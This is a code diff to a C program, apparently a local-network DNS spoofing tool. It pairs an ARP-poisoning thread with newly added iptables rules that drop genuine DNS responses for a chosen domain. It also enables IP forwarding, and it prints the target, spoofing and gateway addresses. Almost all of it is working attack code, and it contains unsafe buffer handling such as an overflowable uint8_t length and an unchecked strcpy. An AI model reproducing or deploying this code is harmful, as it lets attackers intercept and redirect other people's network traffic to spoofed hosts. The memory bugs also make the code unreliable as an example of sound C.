@@ -31,16 +31,9 @@ int main(int argc, char *argv[]) {
     get_gateway_ip_address();
     get_ip_address();   // Returning IP address
     get_device_ip(nic_device);
+    set_iptables_rule();
 
-
-    // Confirm
-    printf("=================================\n");
-    printf("   Target   IP : %s\n", opts.target_ip);
-    printf("   Request URL : %s\n", opts.request_url);
-    printf("   Spoofing IP : %s\n", opts.spoofing_ip);
-    printf("   Gateway  IP : %s\n", opts.gateway_ip);
-    printf("=================================\n");
-    puts("[ DNS Spoofing Initiated ]");
+    print_input();
 
     pthread_create(&thread_id, NULL, arp_poisoning, NULL);
 
@@ -68,6 +61,17 @@ int main(int argc, char *argv[]) {
 }
 
 
+void print_input(void) {
+    printf("=================================\n");
+    printf("   Target   IP : %s\n", opts.target_ip);
+    printf("   Request URL : %s\n", opts.request_url);
+    printf("   Spoofing IP : %s\n", opts.spoofing_ip);
+    printf("   Gateway  IP : %s\n", opts.gateway_ip);
+    printf("=================================\n");
+    puts("[ DNS Spoofing Initiated ]");
+}
+
+
 void options_spoofing_init(struct options_spoofing* option) {
     memset(option, 0, sizeof(struct options_spoofing));
 }
@@ -81,6 +85,7 @@ void program_setup(int argc, char *argv[]) {
     /* Flush caches that has website already visited */
     system(FLUSH_CASH1);
     system(FLUSH_CASH2);
+    system(FORWARD_1);
 
     /* change the UID/GID to 0 (raise privilege) */
     setuid(0);
@@ -198,6 +203,9 @@ void sig_handler(int signum) {
     //Return type of the handler function should be void
     char cmd[64] = {0};
     pid = getpid();
+
+    system(FORWARD_0);
+    system(IPT_FLUSH);
     printf("Ctrl + C pressed\n Exit program \n");
     sprintf(cmd, "sudo kill -9 %d", pid);
     kill(pid,SIGUSR1);
@@ -322,3 +330,38 @@ void* arp_poisoning() {
     }
 }
 
+
+void set_iptables_rule(void) {
+    char *url, *token;
+    uint8_t size = (uint8_t) (strlen(opts.request_url) * 2);
+    char *hex_url = malloc(sizeof(char) * size + 1);
+    char rule[256] = {0};
+    char temp[64] = {0};
+
+    strcpy(temp, opts.request_url);
+    memset(hex_url, 0, size + 1);
+    url = strstr(temp, "www");
+    if (url) {
+        url += 4;
+        token = strtok(url, ".");
+        for (int i = 0; i < strlen(token); i++) {
+            sprintf(hex_url + (i * 2), "%x", token[i]);
+        }
+    }
+    else {
+        token = strtok(temp, ".");
+        for (int i = 0; i < strlen(token); i++) {
+            sprintf(hex_url + (i * 2), "%x", token[i]);
+        }
+    }
+
+    sprintf(rule, "iptables -A FORWARD -p udp --sport 53 --match string --algo kmp --hex-string '|%s|' --jump DROP", hex_url);
+    system(rule);
+    memset(rule, 0, sizeof(rule));
+
+    sprintf(rule, "iptables -A FORWARD -p tcp --sport 53 --match string --algo kmp --hex-string '|%s|' --jump DROP", hex_url);
+    system(rule);
+    memset(rule, 0, sizeof(rule));
+
+    free(hex_url);
+}
